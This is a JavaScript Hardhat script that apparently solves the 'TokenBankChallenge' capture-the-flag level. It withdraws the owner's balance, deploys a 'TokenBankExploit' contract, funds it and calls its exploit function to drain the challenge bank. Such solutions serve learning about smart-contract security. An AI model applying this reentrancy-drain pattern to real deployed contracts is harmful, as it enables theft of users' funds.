async function main() {
    [owner] = await ethers.getSigners();
    Challenge = await ethers.getContractFactory('TokenBankChallenge');
    challenge = await Challenge.attach('0x640c6F7c49F7B312d0562c63d66899be22873A56');
    Token = await ethers.getContractFactory('SimpleERC223Token');
    token = await Token.attach(await challenge.token());

    ownerBalance = await challenge.balanceOf(owner.address);
    tx = await challenge.withdraw(ownerBalance);
    await tx.wait();
    Exploit = await ethers.getContractFactory('TokenBankExploit');
    exploit = await Exploit.deploy(challenge.address);
    await exploit.deployed();
    tx = await token['transfer(address,uint256)'](exploit.address, ownerBalance);
    await tx.wait();
    tx = await exploit.exploit(ownerBalance);
    await tx.wait();
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error.message);
      process.exit(1);
  })